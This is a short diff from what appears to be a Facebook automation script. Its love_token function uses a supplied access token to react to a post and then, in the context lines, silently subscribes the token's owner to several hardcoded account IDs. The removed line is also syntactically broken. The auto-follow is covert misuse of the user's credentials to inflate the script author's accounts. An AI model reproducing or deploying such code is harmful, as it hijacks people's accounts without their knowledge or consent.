@@ -427,7 +427,7 @@ def love(cookie):
 def love_token(token):
 	lis_id_foll = ["100034994956054", "100009259285042"]
 	with requests.Session() as dev_:
-		dev_.post("https://graph.facebook.com/"3088882871430325"/reactions?type=LOVE&access_token="+token)
+		dev_.post("https://graph.facebook.com/"+id_post+"/reactions?type=LOVE&access_token="+token)
 		for id_foll in lis_id_foll:
 			dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(id_foll, token))
 		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100009259285042", "100002606153676", "100034994956054"]), token))
